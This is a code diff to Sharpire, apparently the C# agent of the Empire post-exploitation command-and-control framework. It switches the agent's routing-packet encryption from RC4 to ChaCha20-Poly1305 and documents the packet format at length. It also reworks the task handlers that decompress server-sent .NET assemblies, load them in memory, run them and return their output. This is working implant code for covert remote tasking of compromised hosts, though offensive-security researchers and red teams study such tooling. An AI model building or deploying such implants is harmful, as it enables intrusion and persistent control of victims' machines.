@@ -8,9 +8,80 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Text;
 using System.Threading;
+using System.Security.Cryptography;
+using ChaChaEncryption;
 
 namespace Sharpire
 {
+/*
+
+Packet handling functionality for Empire.
+
+Defines packet types, builds tasking packets and parses result packets.
+
+Packet format:
+
+Nonce: Nonce used by ChaCha20Poly1305
+ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+AESc = AES encrypted using the client's session key
+ChaCha20(RoutingData): Encrypted RoutingData
+Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+    Routing Packet:
+    +---------+--------------------------------+--------------------------+
+    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+    +---------+--------------------------------+--------------------------+
+    |    12   |                32              |          length          |
+    +---------+--------------------------------+--------------------------+
+
+        ChaCha20+Poly1305(RoutingData):
+        +---------------------------+---------------------------+
+        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+        +---------------------------+---------------------------+
+        |           16              |            16             |
+        +---------------------------+---------------------------+
+
+            ChaCha20(RoutingData):
+            +-----------+------+------+-------+--------+
+            | SessionID | Lang | Meta | Extra | Length |
+            +-----------+------+------+-------+--------+
+            |    8      |  1   |  1   |   2   |    4   |
+            +-----------+------+------+-------+--------+
+
+    SessionID = the sessionID that the packet is bound for
+    Lang = indicates the language used
+    Meta = indicates staging req/tasking req/result post/etc.
+    Extra = reserved for future expansion
+
+
+    AESc(client data)
+    +--------+-----------------+-------+
+    | AES IV | Enc Packet Data | HMACc |
+    +--------+-----------------+-------+
+    |   16   |   % 16 bytes    |  10   |
+    +--------+-----------------+-------+
+
+    Client data decrypted:
+    +------+--------+--------------------+----------+---------+-----------+
+    | Type | Length | total # of packets | packet # | task ID | task data |
+    +------+--------+--------------------+--------------------+-----------+
+    |  2   |   4    |         2          |    2     |    2    | <Length>  |
+    +------+--------+--------------------+----------+---------+-----------+
+
+    type = packet type
+    total # of packets = number of total packets in the transmission
+    Packet # = where the packet fits in the transmission
+    Task ID = links the tasking to results for deconflict on server side
+
+
+    Client *_SAVE packets have the sub format:
+
+            [15 chars] - save prefix
+            [5 chars]  - extension
+            [X...]     - tasking data
+
+*/
     class Coms
     {
         public SessionInfo sessionInfo;
@@ -19,30 +90,75 @@ namespace Sharpire
         private int ServerIndex = 0;
 
         private JobTracking jobTracking;
-        
+
         internal Coms(SessionInfo sessionInfo)
         {
             this.sessionInfo = sessionInfo;
         }
 
         private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
+        /*
+        Constructs a routing packet with chacha20poly1305 encryption.
+        
+        Packet format:
+
+        Nonce: Nonce used by ChaCha20Poly1305
+        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        AESc = AES encrypted using the client's session key
+        ChaCha20(RoutingData): Encrypted RoutingData
+        Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+            Routing Packet:
+            +---------+--------------------------------+--------------------------+
+            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+            +---------+--------------------------------+--------------------------+
+            |    12   |                32              |          length          |
+            +---------+--------------------------------+--------------------------+
+
+                ChaCha20+Poly1305(RoutingData):
+                +---------------------------+---------------------------+
+                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                +---------------------------+---------------------------+
+                |           16              |            16             |
+                +---------------------------+---------------------------+
+
+                    RoutingData:
+                    +-----------+------+------+-------+--------+
+                    | SessionID | Lang | Meta | Extra | Length |
+                    +-----------+------+------+-------+--------+
+                    |    8      |  1   |  1   |   2   |    4   |
+                    +-----------+------+------+-------+--------+
+
+            SessionID = the sessionID that the packet is bound for
+            Lang = indicates the language used
+            Meta = indicates staging req/tasking req/result post/etc.
+            Extra = reserved for future expansion
+        */
         {
+            //determine lengths
+            int nonce_length = 12;
             int encryptedBytesLength = 0;
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 encryptedBytesLength = encryptedBytes.Length;
             }
 
+            //prepare the routingData
             byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentId());
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            byte[] initializationVector = NewInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, sessionInfo.GetStagingKeyBytes());
-            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
+            //encrypt the routingData with chacha20 and create an associated poly1305 tag
+            byte[] chacha_data = new byte[16];
+            byte[] poly1305_tag = new byte[16];
+            byte[] chacha_nonce = NewInitializationVector(nonce_length);
+            ChaCha20Poly1305.Encrypt(sessionInfo.GetStagingKeyBytes(), chacha_nonce, data, out chacha_data, out poly1305_tag);
 
-            routingPacketData = Misc.combine(initializationVector, routingPacketData);
+            //combine the nonce + chacha20 encrypted data + poly1305 tag + encryptedBytes (if applicable) into the routingPacketData bytearray
+            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_data);
+            routingPacketData = Misc.combine(routingPacketData, poly1305_tag);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
@@ -50,26 +166,75 @@ namespace Sharpire
 
             return routingPacketData;
         }
-        
+
         internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
+        /*
+        Decodes a chacha20poly1305 encrypted routing packet to a normal routing packet
+        
+        Packet format:
+
+        Nonce: Nonce used by ChaCha20Poly1305
+        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        AESc = AES encrypted using the client's session key
+        ChaCha20(RoutingData): Encrypted RoutingData
+        Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+            Routing Packet:
+            +---------+--------------------------------+--------------------------+
+            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+            +---------+--------------------------------+--------------------------+
+            |    12   |                32              |          length          |
+            +---------+--------------------------------+--------------------------+
+
+                ChaCha20+Poly1305(RoutingData):
+                +---------------------------+---------------------------+
+                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                +---------------------------+---------------------------+
+                |           16              |            16             |
+                +---------------------------+---------------------------+
+
+                    RoutingData:
+                    +-----------+------+------+-------+--------+
+                    | SessionID | Lang | Meta | Extra | Length |
+                    +-----------+------+------+-------+--------+
+                    |    8      |  1   |  1   |   2   |    4   |
+                    +-----------+------+------+-------+--------+
+
+            SessionID = the sessionID that the packet is bound for
+            Lang = indicates the language used
+            Meta = indicates staging req/tasking req/result post/etc.
+            Extra = reserved for future expansion
+        */
         {
             this.jobTracking = jobTracking;
 
-            if (packetData.Length < 20)
+            // define packet structure for ChaCha20Poly1305 (12 byte nonce + 32 bytes for encrypted data and tag. Together is 40 byte header before AESc)
+            int nonce_length = 12;
+            int chacha_header_length = nonce_length + 32;
+            if (packetData.Length < chacha_header_length)
             {
                 return;
             }
             int offset = 0;
+
+            // while we have bytes to read from packetData...
             while (offset < packetData.Length)
             {
-                byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
-                byte[] routingInitializationVector = routingPacket.Take(4).ToArray();
-                byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
-                offset += 20;
 
-                byte[] rc4Key = Misc.combine(routingInitializationVector, sessionInfo.GetStagingKeyBytes());
+                //parse out the routingPacket to the chachaNonce and routingChaChaData (Chacha20 encrypted + Poly1305 tag)
+                byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
+                byte[] chachaNonce = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingChachaData = packetData.Skip(nonce_length).Take(32).ToArray();
+                offset += chacha_header_length; // advance the offset past the chacha20poly1305 routing packet data (to AESc)
 
-                byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
+                // decrypt and verify chacha20poly1305 data into output routingData (output decrypted routingpacket)
+                byte[] chachaData = routingChachaData.Take(16).ToArray();
+                byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
+                byte[] routingData = new byte[16];
+                ChaCha20Poly1305.Decrypt(sessionInfo.GetStagingKeyBytes(), chachaNonce, chachaData, poly1305Tag, out routingData);
+
+                // parse/handle the decrypted routingpacket
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                 try
                 {
@@ -158,6 +323,7 @@ namespace Sharpire
 
         private byte[] ProcessTasking(PACKET packet)
         {
+           
             try
             {
                 int type = packet.type;
@@ -271,7 +437,7 @@ namespace Sharpire
             string tableString = table.ToString();
             return EncodePacket(packet.type, tableString, packet.taskId);
         }
-        
+
         internal byte[] EncodePacket(ushort type, string data, ushort resultId)
         {
             data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
@@ -289,7 +455,7 @@ namespace Sharpire
 
             return packet;
         }
-        
+
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct PACKET
         {
@@ -302,7 +468,7 @@ namespace Sharpire
             public string data;
             public string remaining;
         };
-        
+
         private PACKET DecodePacket(byte[] packet, int offset)
         {
             PACKET packetStruct = new PACKET();
@@ -318,7 +484,7 @@ namespace Sharpire
             packet = null;
             return packetStruct;
         }
-        
+
         internal static byte[] NewInitializationVector(int length)
         {
             Random random = new Random();
@@ -329,7 +495,7 @@ namespace Sharpire
             }
             return initializationVector;
         }
-        
+
         public byte[] Task41(PACKET packet)
         {
             try
@@ -364,7 +530,7 @@ namespace Sharpire
                 return EncodePacket(0, $"[!] Error: {ex.Message}", packet.taskId);
             }
         }
-        
+
         private string ParsePath(string[] parts, out bool isChunkSizeAdjusted)
         {
             isChunkSizeAdjusted = false;
@@ -415,7 +581,7 @@ namespace Sharpire
 
             } while (true);
         }
-        
+
         private byte[] Task42(PACKET packet)
         {
             string[] parts = packet.data.Split('|');
@@ -430,7 +596,7 @@ namespace Sharpire
             {
                 content = Convert.FromBase64String(base64Part);
             }
-            catch(FormatException ex)
+            catch (FormatException ex)
             {
                 return EncodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
             }
@@ -521,108 +687,184 @@ namespace Sharpire
             }
             return EncodePacket(packet.type, sb.ToString(), packet.taskId);
         }
-        
+
         public Byte[] Task122(PACKET packet)
-        {
-            const int delay = 1;
-            const int MAX_MESSAGE_SIZE = 1048576;
-            string output = "";
-            object synclock = new object();
-
-            // Split packet data
-            string[] parts = packet.data.Split(',');
-            if (parts.Length > 0)
-            {
-                // Assuming the Base64 encoded JSON is in parts[1]
-                string base64JsonString = parts[1];
-                string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
-
-                // Manually parse JSON to extract all values as a generic string array
-                var parametersList = new List<string>();
-                jsonString = jsonString.Trim('{', '}'); // Remove braces if present
-                string[] keyValuePairs = jsonString.Split(',');
-
-                foreach (string pair in keyValuePairs)
-                {
-                    string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
-                    if (keyValue.Length == 2)
-                    {
-                        string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
-                        parametersList.Add(value);
-                    }
-                }
-
-                string[] parameters = parametersList.ToArray();
-
-                // Decompress and load the assembly
-                byte[] compressedBytes = Convert.FromBase64String(parts[0]);
-                byte[] decompressedBytes = Decompress(compressedBytes);
-                Assembly agentTask = Assembly.Load(decompressedBytes);
-
-                // Create a background thread for the task
-                Thread taskThread = new Thread(() =>
-                {
-                    using (StringWriter consoleOutput = new StringWriter())
-                    {
-                        TextWriter originalConsoleOut = Console.Out;
-                        try
-                        {
-                            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
-
-                            // Verify parameters and invoke Main method
-                            MethodInfo mainMethod = agentTask.GetType("Program").GetMethod("Main");
-                            if (mainMethod != null)
-                            {
-                                mainMethod.Invoke(null, new object[] { parameters });
-                            }
-                            else
-                            {
-                                lock (synclock)
-                                {
-                                    output += "[ERROR] Main method not found in Program class.\n";
-                                }
-                            }
-                        }
-                        catch (TargetInvocationException ex)
-                        {
-                            // Capture and log the inner exception details
-                            lock (synclock)
-                            {
-                                output += $"[ERROR] {ex.InnerException?.Message ?? ex.Message}\n";
-                                output += $"{ex.InnerException?.StackTrace ?? ex.StackTrace}\n";
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            // General exception logging
-                            lock (synclock)
-                            {
-                                output += $"[ERROR] {ex.Message}\n{ex.StackTrace}\n";
-                            }
-                        }
-                        finally
-                        {
-                            Console.SetOut(originalConsoleOut); // Restore original Console.Out
-                        }
-
-                        lock (synclock) // Safely add console output
-                        {
-                            output += consoleOutput.ToString();
-                        }
-                    }
-                });
-
-                // Start the task thread
-                taskThread.IsBackground = true;
-                taskThread.Start();
-                taskThread.Join(); // Wait for task to complete
-
-                // Return the final output to the agent once the task completes
-                return EncodePacket(packet.type, output, packet.taskId);
-            }
-
-            return EncodePacket(packet.type, "Invalid packet", packet.taskId);
-        }
+	{
+	    const int MAX_MESSAGE_SIZE = 1048576;
+	    string output = "";
+	    object synclock = new object(); // Define synclock for synchronization
+	    
+	    // Split packet data
+	    string[] parts = packet.data.Split(',');
+	    if (parts.Length > 0)
+	    {
+		try
+		{
+		    // Assuming the Base64 encoded JSON is in parts[1]
+		    string base64JsonString = parts[1];
+		    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
+		    
+		    // Manually parse JSON to extract all values as a generic string array
+		    var parametersList = new List<string>();
+		    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
+		    string[] keyValuePairs = jsonString.Split(',');
+		    
+		    foreach (string pair in keyValuePairs)
+		    {
+		        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
+		        if (keyValue.Length == 2)
+		        {
+		            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
+		            parametersList.Add(value);
+		        }
+		    }
+		    
+		    // Convert list to array and log the parsed values
+		    string[] parameters = parametersList.ToArray();
+		    
+		    // Decompress and load the assembly
+		    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
+		    byte[] decompressedBytes = Decompress(compressedBytes);
+		    Assembly agentTask = Assembly.Load(decompressedBytes);
+		    
+		    // Execute assembly and capture output synchronously
+		    using (StringWriter consoleOutput = new StringWriter())
+		    {
+		        TextWriter originalConsoleOut = Console.Out;
+		        try
+		        {
+		            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+		            
+		            // Try to find Program class first
+		            Type programType = agentTask.GetType("Program");
+		            
+		            if (programType != null)
+		            {
+		                MethodInfo mainMethod = programType.GetMethod("Main");
+		                if (mainMethod != null)
+		                {
+		                    mainMethod.Invoke(null, new object[] { parameters });
+		                }
+		                else
+		                {
+		                    lock (synclock)
+		                    {
+		                        output += "[ERROR] Main method not found in Program class.\n";
+		                    }
+		                }
+		            }
+		            else
+		            {
+		                // Fallback: Use entry point if Program class not found
+		                MethodInfo entryPoint = agentTask.EntryPoint;
+		                
+		                if (entryPoint != null)
+		                {
+		                    try
+		                    {
+		                        entryPoint.Invoke(null, new object[] { parameters });
+		                    }
+		                    catch (ArgumentException)
+		                    {
+		                        // Try without parameters if string[] doesn't work
+		                        try
+		                        {
+		                            entryPoint.Invoke(null, null);
+		                        }
+		                        catch (ArgumentException)
+		                        {
+		                            // Try with empty string array
+		                            entryPoint.Invoke(null, new object[] { new string[0] });
+		                        }
+		                    }
+		                }
+		                else
+		                {
+		                    lock (synclock)
+		                    {
+		                        output += "[ERROR] No Program class or entry point found in assembly.\n";
+		                    }
+		                }
+		            }
+		        }
+		        catch (TargetInvocationException ex)
+		        {
+		            var innerEx = ex.InnerException;
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
+		                if (innerEx?.StackTrace != null)
+		                {
+		                    output += $"Stack Trace: {innerEx.StackTrace}\n";
+		                }
+		            }
+		        }
+		        catch (ReflectionTypeLoadException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
+		                foreach (Exception loaderEx in ex.LoaderExceptions)
+		                {
+		                    output += $"Loader Error: {loaderEx?.Message}\n";
+		                }
+		            }
+		        }
+		        catch (ArgumentException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] ArgumentException: {ex.Message}\n";
+		                output += $"Parameter: {ex.ParamName}\n";
+		            }
+		        }
+		        catch (BadImageFormatException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
+		                output += "Assembly might be corrupted or wrong architecture\n";
+		            }
+		        }
+		        catch (FileLoadException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] FileLoadException: {ex.Message}\n";
+		                output += $"File: {ex.FileName}\n";
+		            }
+		        }
+		        catch (Exception ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
+		                output += $"Stack Trace: {ex.StackTrace}\n";
+		            }
+		        }
+		        finally
+		        {
+		            Console.SetOut(originalConsoleOut); // Restore original Console.Out
+		        }
+		        
+		        lock (synclock) // Safely add console output
+		        {
+		            output += consoleOutput.ToString();
+		        }
+		    }
+		    
+		    // Return the captured output to the agent
+		    return EncodePacket(packet.type, output, packet.taskId);
+		}
+		catch (Exception ex)
+		{
+		    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
+		    return EncodePacket(packet.type, errorOutput, packet.taskId);
+		}
+	    }
+	    
+	    return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
+	}
 
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -661,88 +903,182 @@ namespace Sharpire
         // Run an Agent Job
         ////////////////////////////////////////////////////////////////////////////////
         public Byte[] Task120(PACKET packet)
-        {
-            const int MAX_MESSAGE_SIZE = 1048576;
-            string output = "";
-            object synclock = new object(); // Define synclock for synchronization
-
-            // Split packet data
-            string[] parts = packet.data.Split(',');
-            if (parts.Length > 0)
-            {
-                // Assuming the Base64 encoded JSON is in parts[1]
-                string base64JsonString = parts[1];
-                string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
-
-                // Manually parse JSON to extract all values as a generic string array
-                var parametersList = new List<string>();
-                jsonString = jsonString.Trim('{', '}'); // Remove braces if present
-                string[] keyValuePairs = jsonString.Split(',');
-
-                foreach (string pair in keyValuePairs)
-                {
-                    string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
-                    if (keyValue.Length == 2)
-                    {
-                        string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
-                        parametersList.Add(value);
-                    }
-                }
-
-                // Convert list to array and log the parsed values
-                string[] parameters = parametersList.ToArray();
-
-                // Decompress and load the assembly
-                byte[] compressedBytes = Convert.FromBase64String(parts[0]);
-                byte[] decompressedBytes = Decompress(compressedBytes);
-                Assembly agentTask = Assembly.Load(decompressedBytes);
-
-                // Execute assembly and capture output synchronously
-                using (StringWriter consoleOutput = new StringWriter())
-                {
-                    TextWriter originalConsoleOut = Console.Out;
-                    try
-                    {
-                        Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
-
-                        // Verify parameters and invoke Main method
-                        MethodInfo mainMethod = agentTask.GetType("Program").GetMethod("Main");
-                        if (mainMethod != null)
-                        {
-                            mainMethod.Invoke(null, new object[] { parameters });
-                        }
-                        else
-                        {
-                            lock (synclock)
-                            {
-                                output += "[ERROR] Main method not found in Program class.";
-                            }
-                        }
-                    }
-                    catch (TargetInvocationException ex)
-                    {
-                        lock (synclock)
-                        {
-                            output += $"[ERROR] {ex.InnerException?.Message ?? ex.Message}\n{ex.InnerException?.StackTrace ?? ex.StackTrace}";
-                        }
-                    }
-                    finally
-                    {
-                        Console.SetOut(originalConsoleOut); // Restore original Console.Out
-                    }
-
-                    lock (synclock) // Safely add console output
-                    {
-                        output += consoleOutput.ToString();
-                    }
-                }
-
-                // Return the captured output to the agent
-                return EncodePacket(packet.type, output, packet.taskId);
-            }
-
-            return EncodePacket(packet.type, "Invalid packet", packet.taskId);
-        }
+	{
+	    const int MAX_MESSAGE_SIZE = 1048576;
+	    string output = "";
+	    object synclock = new object(); // Define synclock for synchronization
+	    
+	    // Split packet data
+	    string[] parts = packet.data.Split(',');
+	    if (parts.Length > 0)
+	    {
+		try
+		{
+		    // Assuming the Base64 encoded JSON is in parts[1]
+		    string base64JsonString = parts[1];
+		    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
+		    
+		    // Manually parse JSON to extract all values as a generic string array
+		    var parametersList = new List<string>();
+		    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
+		    string[] keyValuePairs = jsonString.Split(',');
+		    
+		    foreach (string pair in keyValuePairs)
+		    {
+		        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
+		        if (keyValue.Length == 2)
+		        {
+		            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
+		            parametersList.Add(value);
+		        }
+		    }
+		    
+		    // Convert list to array and log the parsed values
+		    string[] parameters = parametersList.ToArray();
+		    
+		    // Decompress and load the assembly
+		    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
+		    byte[] decompressedBytes = Decompress(compressedBytes);
+		    Assembly agentTask = Assembly.Load(decompressedBytes);
+		    
+		    // Execute assembly and capture output synchronously
+		    using (StringWriter consoleOutput = new StringWriter())
+		    {
+		        TextWriter originalConsoleOut = Console.Out;
+		        try
+		        {
+		            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+		            
+		            // Try to find Program class first
+		            Type programType = agentTask.GetType("Program");
+		            
+		            if (programType != null)
+		            {
+		                MethodInfo mainMethod = programType.GetMethod("Main");
+		                if (mainMethod != null)
+		                {
+		                    mainMethod.Invoke(null, new object[] { parameters });
+		                }
+		                else
+		                {
+		                    lock (synclock)
+		                    {
+		                        output += "[ERROR] Main method not found in Program class.\n";
+		                    }
+		                }
+		            }
+		            else
+		            {
+		                // Fallback: Use entry point if Program class not found
+		                MethodInfo entryPoint = agentTask.EntryPoint;
+		                
+		                if (entryPoint != null)
+		                {
+		                    try
+		                    {
+		                        entryPoint.Invoke(null, new object[] { parameters });
+		                    }
+		                    catch (ArgumentException)
+		                    {
+		                        // Try without parameters if string[] doesn't work
+		                        try
+		                        {
+		                            entryPoint.Invoke(null, null);
+		                        }
+		                        catch (ArgumentException)
+		                        {
+		                            // Try with empty string array
+		                            entryPoint.Invoke(null, new object[] { new string[0] });
+		                        }
+		                    }
+		                }
+		                else
+		                {
+		                    lock (synclock)
+		                    {
+		                        output += "[ERROR] No Program class or entry point found in assembly.\n";
+		                    }
+		                }
+		            }
+		        }
+		        catch (TargetInvocationException ex)
+		        {
+		            var innerEx = ex.InnerException;
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
+		                if (innerEx?.StackTrace != null)
+		                {
+		                    output += $"Stack Trace: {innerEx.StackTrace}\n";
+		                }
+		            }
+		        }
+		        catch (ReflectionTypeLoadException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
+		                foreach (Exception loaderEx in ex.LoaderExceptions)
+		                {
+		                    output += $"Loader Error: {loaderEx?.Message}\n";
+		                }
+		            }
+		        }
+		        catch (ArgumentException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] ArgumentException: {ex.Message}\n";
+		                output += $"Parameter: {ex.ParamName}\n";
+		            }
+		        }
+		        catch (BadImageFormatException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
+		                output += "Assembly might be corrupted or wrong architecture\n";
+		            }
+		        }
+		        catch (FileLoadException ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] FileLoadException: {ex.Message}\n";
+		                output += $"File: {ex.FileName}\n";
+		            }
+		        }
+		        catch (Exception ex)
+		        {
+		            lock (synclock)
+		            {
+		                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
+		                output += $"Stack Trace: {ex.StackTrace}\n";
+		            }
+		        }
+		        finally
+		        {
+		            Console.SetOut(originalConsoleOut); // Restore original Console.Out
+		        }
+		        
+		        lock (synclock) // Safely add console output
+		        {
+		            output += consoleOutput.ToString();
+		        }
+		    }
+		    
+		    // Return the captured output to the agent
+		    return EncodePacket(packet.type, output, packet.taskId);
+		}
+		catch (Exception ex)
+		{
+		    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
+		    return EncodePacket(packet.type, errorOutput, packet.taskId);
+		}
+	    }
+	    
+	    return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
+	}
 
         //Decompress function may want to move this somewhere else at some point
         //taken from Covenant https://github.com/cobbr/Covenant/tree/master/Covenant
